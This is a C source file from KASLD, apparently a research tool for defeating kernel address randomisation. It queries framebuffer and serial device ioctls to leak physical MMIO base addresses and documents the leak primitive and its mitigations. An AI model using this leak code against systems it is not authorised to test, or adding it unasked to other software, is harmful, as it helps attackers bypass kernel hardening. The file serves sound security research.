// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Read physical MMIO base addresses from framebuffer and serial device ioctls.
// A fallback for /proc/iomem (CAP_SYS_ADMIN-masked) and sysfs PCI resources
// (PCI-only): framebuffer and on-chip serial are typically *platform* devices,
// whose MMIO windows neither source exposes.
//
//   /dev/fb*   FBIOGET_FSCREENINFO -> struct fb_fix_screeninfo
//                .smem_start  physical frame-buffer base   (+ .smem_len)
//                .mmio_start  device MMIO register base    (+ .mmio_len)
//   /dev/ttyS*, /dev/ttyAMA*
//              TIOCGSERIAL -> struct serial_struct
//                .iomem_base  = uport->mapbase, the UART's physical MMIO base
//                             (0 for legacy port-I/O 8250 — x86 COM ports)
//
// Both GET paths copy the raw physical address (not %p-hashed, no
// kptr_restrict) and are *ungated*: fbmem.c's FBIOGET_FSCREENINFO has no
// capability check, and serial_core.c's uart_get_info() gates only the SET
// path, not the GET. The only barrier is opening the device node (video /
// dialout group, or root).
//
// Leak primitive:
//   Data leaked:      physical MMIO base addresses (framebuffer / UART)
//   Kernel subsystem: drivers/video/fbdev (FBIOGET_FSCREENINFO),
//                     drivers/tty/serial   (TIOCGSERIAL / uart_get_info)
//   Address type:     physical (MMIO)
//   Method:           parsed (device ioctl)
//   Status:           unfixed (information exposure by design)
//   Access check:     none beyond device-node permissions (no CAP / kptr gate)
//
// Engine fit: emitted as REGION_MMIO PHYS windows (range when a length is
// known, else a base), which mmio_floor_phys_ceiling uses to ceiling
// Q_PHYS_TEXT_BASE (the image must sit in DRAM below the lowest MMIO above it).
// Decoupled arches only; loose, and additive mainly when /proc/iomem is masked.
//
// Mitigations:
//   CONFIG_FB=n / CONFIG_SERIAL_CORE=n remove the respective source; tightening
//   device-node group permissions removes the access. No runtime sysctl gate.
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld/api.h"
#include "include/kasld/cli.h"

#include <fcntl.h>
#include <linux/fb.h>
#include <linux/serial.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Queries framebuffer (FBIOGET_FSCREENINFO -> smem_start/mmio_start) and "
    "serial (TIOCGSERIAL -> iomem_base) device ioctls for physical MMIO base "
    "addresses. Both GET paths are ungated (no capability or kptr_restrict "
    "check); access needs only the device node (video/dialout group). MMIO "
    "bases ceiling the physical kernel base on decoupled arches — a fallback "
    "for when /proc/iomem is masked and for platform (non-PCI) devices.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:physical\n");

/* Emit one MMIO window as a PHYS landmark: a range when a length is known, else
 * a base (lo edge). Both set HAS_LO, which mmio_floor_phys_ceiling consumes.
 * Returns 1 if emitted, 0 for a zero (absent) base. */
static int emit_mmio(unsigned long start, unsigned long len, const char *name) {
  unsigned long hi;
  if (!start)
    return 0;
  if (len && !kasld_add_ovf(start, len - 1, &hi))
    kasld_result_range(KASLD_TYPE_PHYS, REGION_MMIO, start, hi, name,
                       CONF_PARSED);
  else
    kasld_result_base(KASLD_TYPE_PHYS, REGION_MMIO, start, name, CONF_PARSED);
  return 1;
}

/* FBIOGET_FSCREENINFO returns fb_fix_screeninfo with the physical frame-buffer
 * (smem_start) and device-MMIO (mmio_start) bases. */
static int scan_framebuffers(void) {
  int found = 0;
  for (int i = 0; i < 8; i++) {
    char dev[32];
    snprintf(dev, sizeof(dev), "/dev/fb%d", i);
    int fd = kasld_open(dev, O_RDONLY | O_NONBLOCK | O_NOCTTY);
    if (fd < 0)
      continue;
    struct fb_fix_screeninfo fix;
    memset(&fix, 0, sizeof(fix));
    if (ioctl(fd, FBIOGET_FSCREENINFO, &fix) == 0) {
      found += emit_mmio(fix.smem_start, fix.smem_len, "framebuffer");
      found += emit_mmio(fix.mmio_start, fix.mmio_len, "fb_mmio");
    }
    close(fd);
  }
  return found;
}

/* TIOCGSERIAL returns serial_struct.iomem_base = uport->mapbase, the physical
 * MMIO base of an MMIO-mapped UART (0 for legacy port-I/O 8250). */
static int scan_serial(void) {
  static const char *const fmts[] = {"/dev/ttyS%d", "/dev/ttyAMA%d", NULL};
  int found = 0;
  for (int t = 0; fmts[t]; t++) {
    for (int i = 0; i < 4; i++) {
      char dev[32];
      snprintf(dev, sizeof(dev), fmts[t], i);
      int fd = kasld_open(dev, O_RDONLY | O_NONBLOCK | O_NOCTTY);
      if (fd < 0)
        continue;
      struct serial_struct ss;
      memset(&ss, 0, sizeof(ss));
      if (ioctl(fd, TIOCGSERIAL, &ss) == 0)
        found += emit_mmio((unsigned long)(uintptr_t)ss.iomem_base, 0,
                           "serial_mmio");
      close(fd);
    }
  }
  return found;
}

int main(int argc, char **argv) {
  kasld_cli(argc, argv);

  kasld_info(
      "querying framebuffer / serial ioctls for physical MMIO bases ...");
  int found = scan_framebuffers() + scan_serial();

  if (!found) {
    kasld_err("no MMIO bases from fb/serial ioctls "
              "(no accessible device, or port-I/O only)");
    return 0;
  }
  kasld_found("leaked %d physical MMIO base(s) via device ioctls", found);
  return 0;
}
